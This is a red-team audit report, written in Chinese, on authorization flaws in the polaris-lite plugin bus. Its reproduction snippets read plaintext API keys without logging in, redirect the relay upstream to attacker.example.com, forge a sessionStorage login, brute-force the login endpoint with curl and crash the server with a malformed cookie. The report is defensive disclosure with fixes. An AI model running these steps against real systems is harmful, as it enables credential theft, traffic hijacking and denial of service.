# 红队审计报告：总线层权限检查（polaris-lite）

> 审计对象：`src/core/bus.ts`（authGuard/isPublicCap/dispatch/dispatchStream）、`src/core/hostRuntime.ts`（setAuthGuard）、`src/main.tsx`（装配时序）、`src/core/useAuthGate.ts`、`plugins/mock-auth/index.tsx`（guard 注册方）、`plugins/config-manager`、`plugins/model-admin`、`server/auth-session.mjs`、`server/relay-core.mjs`。
> 方法：全量读码 + dev server（vite，0.0.0.0:9825）实测。页面内经 `import('/src/core/hostRuntime.ts')` 拿到运行中的总线单例直接调用（vite dev 模块缓存共享，等价于恶意插件/被入侵前端脚本的攻击位）；HTTP 层用 curl 验证。未修改任何项目文件。
> 日期：2026-11-18。视角：攻击者（恶意页面脚本 / 同网段主机 / 被注入的恶意插件 / 未登录访客）。
> 严重度定义：P0 = 未登录即可越权读敏感数据或执行敏感操作；P1 = 可稳定绕过安全机制或造成拒绝服务；P2 = 纵深防御缺陷。

---

## 严重度速览

| 级别 | 数量 | 编号 |
|---|---|---|
| P0 | 3 | V1 authGuard 注册时序失效 → 总线对全部受保护 cap fail-open；V2 cap.config 豁免 → 未登录可读/改任意配置（含明文供应商 key、改 baseURL 劫持中继上游）；V3 伪造 sessionStorage 镜像 → 渲染门禁与权限语义全面失真 |
| P1 | 3 | V4 cap.meta 豁免 → 未登录可读全量能力清单与审计尾；V5 cap.auth login 总线路径无限速、无审计价值（配合服务端限速仅 60s 锁窗）；V6 畸形 Cookie 使 dev 进程崩溃（总线外但影响 guard 所依赖的服务端会话权威） |
| P2 | 2 | V7 dispatchStream 事件广播通道（broadcast）绕过 per-call 订阅隔离，任何插件可经 listen 收到全部引擎事件；V8 `isPublicCap` 豁免 `cap.auth.interrupt` 但该 cap 由引擎提供，豁免名单与提供方无一致性校验 |
| 通过 | 5 | dispatchStream 的 guard 调用与 dispatch 一致；assertAllowed 默认拒绝有效（未声明 cap 的调用方被拒）；cap.auth check 仅回显本地镜像、不泄露服务端信息；服务端 change-credentials 有会话 + 旧密码 + owner 归属三重校验；服务端登录有限速（5 次/60s，实测生效） |

---

## 漏洞详情

### [P0] V1 authGuard 注册时序失效：mock-auth 的 setAuthGuard 永远不会被调用，总线对一切受保护 cap 不设防

**根因（文件:行）：**
- `src/main.tsx:28-30` 先 `await loadExternalPlugins(...)`（内部逐个 `await plugin.setup(api)`）；
- `plugins/mock-auth/index.tsx:289-293` 在 `setup()` 里读 `window.__POLARIS_LITE_HOST__?.setAuthGuard(...)`；
- 而 `window.__POLARIS_LITE_HOST__` 在 `src/main.tsx:45-47` 才赋值——**在全部插件 setup 完成之后**。
- 结果：setup 执行时 `window.__POLARIS_LITE_HOST__` 是 `undefined`，可选链 `?.` 静默跳过，`host.setAuthGuard` 从未被调用，`bus.authGuard` 保持 `null`。
- `src/core/bus.ts:107`：`if (this.authGuard && !this.isPublicCap(req.target))` —— `authGuard` 为 null 时整个分支不生效，**所有 cap 对所有调用方放行**（仅剩 assertAllowed 的插件声明校验，而调用方 pluginId 是调用者自己填的字符串）。

**实测复现（页面 JS 上下文，未登录、无任何 cookie/镜像）：**

```js
// 浏览器打开 http://127.0.0.1:9825/ 后，在 DevTools/注入脚本中：
const mod = await import('/src/core/hostRuntime.ts');
const bus = mod.host.bus;
bus.authGuard === null          // => true（guard 从未注册）
// 未登录直接读明文供应商 key：
const r = await bus.dispatch('attacker', ['cap.model.admin'],
  { target: 'cap.model.admin', action: 'getPlain', payload: { id: 'mosi' } });
r.ok                            // => true
r.data.config.apiKey            // => "sk-<REDACTED-2026-11-18>"
```

实测输出：

```json
{ "authGuardIsNull": true,
  "noMirrorGetPlain": { "ok": true, "apiKey": "sk-a3a57fa..." } }
```

**影响：** 总线层权限检查（三层防御中的第②层）在当前装配顺序下**完全不存在**。任何能进入页面 JS 上下文的代码（XSS、恶意插件、被供应链污染的第三方脚本）都可以未登录调用 `cap.model.admin.getPlain`、`cap.config.*`、`cap.ai.chat` 等全部能力。`bus.ts:36-37` 注释「未注册 = 不拦截（保持无 auth 插件时的可用性）」的 fail-open 设计，在「有 auth 插件但注册时序错误」的现实里变成了永久的静默失效。

**修复建议：**
1. 把 `window.__POLARIS_LITE_HOST__` 的赋值**移到 `loadExternalPlugins` 之前**（一行顺序调整即可消除本漏洞）；
2. 更根本：不要经全局 window 传 setAuthGuard——`LitePlugin.setup(api)` 的 `SlotHostApi` 上应当有受控的 `setAuthGuard`（仅 `provides: ['cap.auth']` 的插件可调用），彻底去掉 window 全局；
3. 短期兜底：mock-auth setup 里若发现 `window.__POLARIS_LITE_HOST__` 不存在，应 `console.error` 并把插件置为故障态，而不是静默降级；
4. 总线侧增加防御：`dispatch` 在 `req.target` 属于敏感清单且 `authGuard === null` 时直接拒绝（fail-closed 默认，由宿主显式开启 fail-open）。

---

### [P0] V2 `isPublicCap` 豁免 `cap.config`：未登录可读/改写任意命名空间配置，含明文供应商 key 与中继上游地址

**根因（文件:行）：**
- `src/core/bus.ts:54-61`：`isPublicCap` 返回 `cap.auth / cap.auth.interrupt / cap.meta / cap.config` 四个豁免；
- `bus.ts:53` 注释自述：「配置含供应商 key，由面板自行管控」——但面板（model-admin）的管控只作用于 `cap.model.admin` 的出口（`publicView` 打码），**对 `cap.config` 这条旁路毫无管辖**；
- `plugins/config-manager/index.ts:35-74`：handler 对 namespace 无任何校验，任意调用方可 get/set/setAll/remove 任意命名空间。

**实测复现（未登录、无镜像、guard 本就为 null）：**

```js
const mod = await import('/src/core/hostRuntime.ts');
const bus = mod.host.bus;
// 读明文 key：
const g = await bus.dispatch('attacker', ['cap.config'],
  { target: 'cap.config', action: 'get', payload: { namespace: 'model-admin', key: 'providers' } });
g.data.value[0].apiKey   // => "sk-<REDACTED-2026-11-18>"
// 改写上游 baseURL（把中继目标换成攻击者服务器）：
await bus.dispatch('attacker', ['cap.config'],
  { target: 'cap.config', action: 'setAll', payload: { namespace: 'model-admin', value: { providers: [
    { id: 'mosi', name: 'MOSI', baseURL: 'https://attacker.example.com/v1', apiKey: 'sk-原值', models: ['nex-n2.6'], activeModel: 'nex-n2.6', enabled: true, isDefault: true } ] } } });
// 读回确认写入成功：baseURL 已变为 attacker.example.com
```

实测输出（setAll 后读回）：

```json
{ "setAll": { "ok": true },
  "readBack": { "baseURL": "https://attacker.example.com/v1", "apiKey": "sk-original-key-still-here", ... } }
```

**影响：**
1. **明文 key 外泄**（与中继报告 V5/V6 同根，这里证明的是「总线豁免」这条独立路径，即使封掉 model-admin 的 getPlain 与 localStorage，cap.config 仍可读）；
2. **中继上游劫持**：改写 `model-admin.providers[].baseURL` 后，real-engine 会把用户对话（含 Authorization 头里的 key）发往攻击者域名——唯一限制是 `relay-core.mjs:58` 的域名白名单，但白名单文件 `plugins/relay-hosts.json` 本身可被写权限/构建流程篡改（见中继报告），且一旦攻击者域名入列即全线失守；
3. `cap.config` 存储落在 `localStorage`（`config-manager/index.ts:15,31`），同源任意脚本（含未登录访客页面上的注入脚本）都可直接读，总线豁免只是把同一份明文又开了一条免鉴权通道。

**修复建议：**
1. 把 `cap.config` 从 `isPublicCap` 豁免名单中移除（未登录不应可读写配置）；
2. 若确需未登录可读部分配置，至少按 namespace/action 白名单：`get` 仅放行非敏感 ns，`set/setAll/remove` 一律要求登录；
3. 供应商 key 这类机密不应存 localStorage、不应经前端可见——参照中继报告修复项，key 管理收口到服务端。

---

### [P0] V3 伪造 `sessionStorage` 镜像即可通过渲染门禁：前端「已登录」与「服务端已登录」完全脱钩

**根因（文件:行）：**
- `plugins/mock-auth/index.tsx:45-54`：`currentStatus()` 只读 `sessionStorage['mock-auth.session.v1']`，不看服务端；
- `plugins/mock-auth/index.tsx:290-292`：guard 语义「镜像判断；服务端权威校验由 /api/model-relay 自身执行」——即总线层 guard **设计上就不查服务端**；
- `src/core/useAuthGate.ts:35-44`：壳层门禁只查 `cap.auth status`（= 本地镜像）。
- 任何同源脚本可写 `sessionStorage`（XSS、恶意插件、甚至用户手滑在控制台），即可让 `useAuthGate` 判定 `authenticated` 并渲染全部业务 UI。

**实测复现：**

```js
// 在未登录页面执行：
sessionStorage.setItem('mock-auth.session.v1', JSON.stringify({
  user: { id: 'u-attacker', name: 'attacker', roles: ['user'] },
  token: 'server-fake123', issuedAt: Date.now() }));
location.reload();
// 刷新后 body 渲染出完整四槽业务 UI（sidebar/stream/input/panel）：
// "Polaris Lite / + 新会话 / 轻量版对话已就绪… / 能力面板 / 模型供应商管理 / 演示登录"
// 此时 /api/auth/status 仍返回 {"status":"unauthenticated"}（服务端未登录）
```

伪造后再经总线：

```js
const check = await bus.dispatch('attacker', ['cap.auth'], { target: 'cap.auth', action: 'check', payload: { permission: 'anything' } });
// => { allowed: true }   ← 伪造镜像使 check 也放行任意 permission
```

**影响：** 渲染层门禁（第①层）可被一行 JS 绕过；`cap.auth check` 的返回值在镜像伪造时不可信。由于服务端中继（第③层）确实独立校验 cookie，模型调用会被 401 挡住（实测 `relayWithoutServerSession: 401`），但**所有纯前端能力**（配置读写、面板数据、会话列表、审计查看）对伪造者敞开——叠加 V1/V2（总线层 fail-open）后，第①②层实际双双失效，安全完全依赖第③层单点。

**修复建议：**
1. `cap.auth status` 应以服务端 `/api/auth/status` 为准（mock-auth 的 `serverStatus()` 函数已存在但从未被 `currentStatus()` 使用——`mock-auth/index.tsx:61-69` 是死代码路径）；
2. guard 同理：即使保留前端快速路径，也应对「敏感 cap」做服务端二次确认或缓存短 TTL 的服务端状态；
3. `check` 的 `allowed` 应结合服务端会话，或至少在文档中明确「仅反映本地镜像，不作为服务端授权依据」。

---

### [P1] V4 `cap.meta` 豁免：未登录可枚举全部能力清单并读取审计尾（含其它插件调用行为画像）

**根因（文件:行）：**
- `src/core/bus.ts:58`：`cap.meta` 豁免；
- `src/core/metaCapability.ts:7-11`：`cap.meta` 返回 `listCapabilities()` 全表 + `tailAudit(20)`。

**实测复现（未登录、无镜像）：**

```js
const meta = await bus.dispatch('attacker', ['cap.meta'], { target: 'cap.meta', action: 'list' });
// meta.data.capabilities => ["cap.ai.chat","cap.ai.chat.interrupt","cap.auth","cap.config","cap.meta","cap.model.admin"]
// meta.data.audit => [{ target:'cap.config', action:'get', pluginId:'model-admin', ok:true }, ...]
```

**影响：** 信息泄露为侦察级：攻击者未登录即可得知系统提供哪些能力、哪些插件在调用什么（审计尾含 pluginId/action/时间/错误信息），便于定点寻找下一步攻击面。`isReadonlySelfInspection`（`bus.ts:207-209`）还特意让 meta 的 describe/list 不入审计——被侦察时无任何痕迹。

**修复建议：** `cap.meta` 移出豁免名单，或至少 describe/list 也要登录后可用；审计尾对未登录调用方返回空数组。

---

### [P1] V5 `cap.auth login` 总线路径无限速、无服务端联动；`logout` 可被未登录者滥用

**根因（文件:行）：**
- `plugins/mock-auth/index.tsx:77-88`：总线 `login` 动作只做格式校验即返回 `{ pendingServer: true }`，无任何速率限制、无失败计数；
- `mock-auth/index.tsx:89-95`：总线 `logout` 对**任何调用**都会向 `/api/auth/logout` 发 fetch 并广播 `auth-changed`；
- 服务端限速（`server/auth-session.mjs:118-127,141-143`）只覆盖 `/api/auth/login` HTTP 端点，总线路径绕开它（虽然当前实现总线 login 不做密码校验，直接爆破必须走 HTTP；但总线 login 是个无成本的身份探测点，且未来任何把校验搬进总线 handler 的改动都会掉进这个无限速陷阱）。

**curl 实测（HTTP 层限速是好的）：**

```bash
# 连续 8 次错误密码登录：
for i in 1 2 3 4 5 6 7 8; do curl -s -o /dev/null -w "try$i:%{http_code} " \
  -X POST http://127.0.0.1:9825/api/auth/login -H "Content-Type: application/json" \
  -d '{"username":"boss","password":"wrongpass"}'; done
# → try1:401 try2:401 try3:401 try4:401 try5:401 try6:429 try7:429 try8:429
# 5 次失败后第 6 次起 429（MAX_FAILS=5，LOCK_MS=60s）——HTTP 层防爆破有效
```

**影响：** 当前实态下总线 login 不泄露可利用信息（只回 `pendingServer`），定 P1 而非 P0 的原因见「已检查通过」节。但两点需记录：① 总线层没有任何调用频控基建；② `logout` 无登录校验即可触发全局 `auth-changed` 广播与一次服务端请求，可被脚本循环滥用制造噪音。

**修复建议：**
1. 总线层为 `cap.auth login` 增加与 HTTP 相同的失败计数/锁窗（或干脆让总线 login 仅做参数整形、强制走 `/api/auth/login` 唯一权威——当前已是这样，建议在文档里把「总线 login 永不校验密码」写成契约防回归）；
2. `logout` 在无本地镜像且无服务端会话时直接返回，不广播。

---

### [P1] V6 畸形 Cookie 可使 dev 服务器进程崩溃（guard 依赖的服务端会话权威的可用性问题）

**根因（文件:行）：**
- `server/auth-session.mjs:66-74`：`parseCookies` 对每段 cookie 值直接 `decodeURIComponent`，`%zz` 这类非法编码抛 `URIError`；
- 该中间件在每个请求（含静态资源）上运行，异常未被 try/catch 包裹 → vite dev 进程整进程退出。

**curl 实测：**

```bash
curl -s -o /dev/null -w "before:%{http_code}\n" http://127.0.0.1:9825/api/auth/status
curl -s -o /dev/null -w "malformed:%{http_code}\n" http://127.0.0.1:9825/api/auth/status -H "Cookie: plite.sid=%zz"
# → before:200  malformed:000（连接被重置，进程崩溃）
# 此后所有请求（含总线所依赖的 /api/auth/*、/api/model-relay）全部不可用，直到人工重启
```

实测日志（`/tmp/plite-dev3.log`）：

```
URIError: URI malformed
    at decodeURIComponent (<anonymous>)
    at parseCookies (.../auth-session.mjs:66)
    at getSession (.../auth-session.mjs:76)
```

**影响：** 严格说是服务端可用性漏洞而非总线漏洞，但它击穿的是「服务端会话权威」——guard 与中继都依赖 `getSession`。未认证远程 DoS，定 P1。

**修复建议：** `decodeURIComponent` 包 try/catch，非法编码按无 cookie 处理（返回 unauthenticated 而非崩溃）。

---

### [P2] V7 `dispatchStream` 的 broadcast 通道绕过订阅隔离：任何插件经 `listen('chat-event')` 可旁听全部引擎事件流

**根因（文件:行）：**
- `src/core/hostRuntime.ts:49-60`：流式 dispatch 把每个事件 `(ev) => runtime.broadcastStream('chat-event', { ...ev, source: 'engine' })` 镜像到宿主广播；
- `src/core/bus.ts:161-164`：`broadcast?.(ev)` 对所有并发流无差别转发；
- 事件 payload 只含 `sessionId/messageId` 等业务字段，无接收方标识，监听者无法（也不被要求）过滤「是否与我相关」。

**影响：** 总线文档宣称「流式事件定向投递……同 cap 并发流互不串扰」（`bus.ts:9-11`），但广播镜像使该保证只对直接订阅者成立：多用户/多会话场景下，插件可旁听不属于自己的流内容。当前单用户本机工具形态危害有限，多租户化时会成为跨会话信息串扰点。定 P2。

**修复建议：** 广播事件附带 `streamKey`（含 pluginId/callSeq），宿主广播前按声明了 `chat-event` 的插件做意图过滤；或在 SlotHostApi.listen 的契约中强制校验 sessionId 归属。

---

### [P2] V8 豁免名单 `cap.auth.interrupt` 与实际提供方脱节：豁免的是「中断认证」而非「认证」，命名与校验均无一致性防线

**根因（文件:行）：**
- `src/core/bus.ts:57`：`target === 'cap.auth.interrupt'` 被豁免登录；
- 该 cap 实际由引擎插件提供（real-engine 的 interrupt，`plugins/real-engine/index.ts`），并非 auth 插件；
- 总线对「豁免名单里的 cap 是否真的存在/由谁提供」无校验。

**实测：**

```js
const r = await bus.dispatch('attacker', ['cap.auth'],
  { target: 'cap.auth.interrupt', action: 'x' });
// => { ok:false, error:"plugin attacker is not granted cap.auth.interrupt" }
```

（本次因调用方未声明而仅被 assertAllowed 拦截；若恶意插件在 manifest.capabilities 里声明 `cap.auth.interrupt`，即可在未登录时中断任意用户的进行中对话——`running` map 按 `sessionId::messageId` 全局可枚举，见 real-engine `interruptHandler` 支持按 sessionId 批量中断。）

**影响：** 未登录（若总线 guard 正常工作的话）仍可中断他人 AI 对话、制造交互中断；命名混淆（`cap.auth.interrupt` 听起来像「认证中断」）会诱导后续维护者错误扩权。定 P2。

**修复建议：** 中断类能力不应豁免登录；或至少将豁免收敛为「对自身会话的 interrupt」，校验 payload.sessionId 属于当前会话。

---

## 已检查通过（无漏洞项）

1. **dispatchStream 与 dispatch 的 guard 调用一致**（任务点 4）：`bus.ts:152-157` 与 `bus.ts:107-112` 逐行同构（同一 `authGuard && !isPublicCap` 前置 + 同样错误文案），流式路径不存在「非流式被拦、流式放行」的分叉。（当然，在 V1 场景下两者同为 fail-open，一致性「一致地不设防」。）
2. **assertAllowed 默认拒绝有效**：调用方 manifest 未声明的 cap 一律 `plugin X is not granted Y`，实测未声明者调 `cap.config`/`cap.auth.interrupt` 均被拒。但注意其强度上限：pluginId 与声明都由调用方自报，对「恶意插件」只能防误用、不能防伪冒——真正的越权防线必须落在 guard（V1 修复）。
3. **cap.auth check 无服务端信息泄露**（任务点 3 后半）：`check` 只回 `{ allowed, reason }`，`allowed` 仅由本地镜像推导（`mock-auth/index.tsx:97-101`），不区分「用户名不存在/密码错误」等服务端细节。但在 V3（镜像可伪造）前提下其结论可被操纵，见 V3。
4. **服务端 change-credentials 会话校验有效**（任务点 5）：curl 未带 cookie 调 `/api/auth/change-credentials` 返回 `401 SESSION_REQUIRED`（`server/auth-session.mjs:182-184`）；且还有旧密码校验（194 行）与会话名=owner 校验（198 行）双重防护，未登录者无法改凭据。
5. **服务端登录限速真实生效**（任务点 3 前半的 HTTP 侧）：实测第 6 次失败即 429（MAX_FAILS=5 / LOCK 60s，`server/auth-session.mjs:141-143`）。已知局限（仅按 socket IP、锁窗仅 60s、成功清零）在 `redteam-session.md` V4 已记录，此处不重复计分。
6. **中继层独立把关**：未登录 curl POST `/api/model-relay` → `401 SESSION_REQUIRED`；伪造前端镜像后页面内 fetch 中继仍 401——三层中的第③层当前是唯一未被攻破的一层（其自身问题见 `redteam-relay.md`）。

---

## 总评

三层防御中，**总线层（第②层）在当前代码实态下是失效的**：`authGuard` 因装配时序从未注册（V1），叠加 `isPublicCap` 对 `cap.config`/`cap.meta` 的宽豁免（V2/V4），未登录的页面脚本可读明文供应商 key、改写中继上游、枚举审计。渲染层门禁（第①层）也可被一行 sessionStorage 伪造绕过（V3）。目前真正兜底的只有中继层的会话 cookie 校验——单点防线，且该层自身在 `redteam-relay.md` 中已有多项 P0（静态文件泄露 key/会话文件等）。**建议优先级：先修 V1（一行时序调整，收益最大），再收 V2/V3 的豁免与镜像信任，最后按中继报告处理服务端泄露面。**
